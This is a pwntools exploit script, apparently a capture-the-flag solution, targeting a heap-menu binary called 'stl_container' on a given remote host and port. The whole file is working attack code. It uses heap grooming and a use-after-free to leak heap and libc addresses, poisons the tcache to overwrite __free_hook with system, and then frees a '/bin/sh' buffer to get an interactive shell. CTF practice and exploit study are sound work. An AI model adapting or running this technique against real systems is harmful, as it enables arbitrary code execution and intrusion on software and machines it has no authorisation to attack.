from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './stl_container'
HOST = '134.175.239.26'
PORT =  8848

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, [])

def add(stl, data): 
    r.sendlineafter('>> ', str(stl))
    r.sendlineafter('>> ', '1')
    r.sendafter(':', data)

def delete(stl, idx=0):
    r.sendlineafter('>> ', str(stl))
    r.sendlineafter('>> ', '2')
    if stl == 1 or stl == 2:
        r.sendlineafter('?\n', str(idx))
    
def show(stl, idx=0):
    r.sendlineafter('>> ', str(stl))
    r.sendlineafter('>> ', '3')
    if stl == 1 or stl == 2:
        r.sendlineafter('?\n', str(idx))


magic = p64(0x21) * (0x98/8)

add(4, magic)
add(4, magic)
add(3, magic)
add(3, magic)
delete(4)
# delete(4)
delete(3)
delete(3)

add(2, magic)
add(2, magic)
delete(2, 0)
show(2, 0)
r.recvuntil('data: ')
leak = u64(r.recvuntil('\n')[:-1] +'\x00'*2)
dbg("leak")
heap = leak - 0x124b0 - 0xa0 - 0x1e0
dbg("heap")
# pause()

target = heap + 0x11e70
leak_addr = heap + 0x125f0
fake = heap + 0x11ed0


delete(2, 0)

add(1, p64(target))
add(1, flat(heap+0x11ef0, heap+0x11ef0, 1, 0xa1, heap+0x11eb0, heap+0x11eb8, heap+0x11ec0, 0xc0bebeef, fake, fake,  heap+0x11f70, 0x621, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef, heap+0x11e70, heap+0x11e70, fake)) 
# pause()
delete(2, 0)
show(1, 0)
r.recvuntil('data: ')
leak = u64(r.recvuntil('\n')[:-1] +'\x00'*2)
dbg("leak")
# add(2, flat(leak_addr, 0, 1))
base = leak - 0x3ebca0
dbg("base")
system = base + 0x4f440
fh = base + 0x3ed8e8

delete(4)
delete(3)
delete(3)
add(2, 'a')
add(2, 'b')
delete(2, 0)
delete(2, 0)

add(2, p64(fh))
# pause()
add(2, p64(system))
add(4, "/bin/sh")
r.interactive()


r.close()
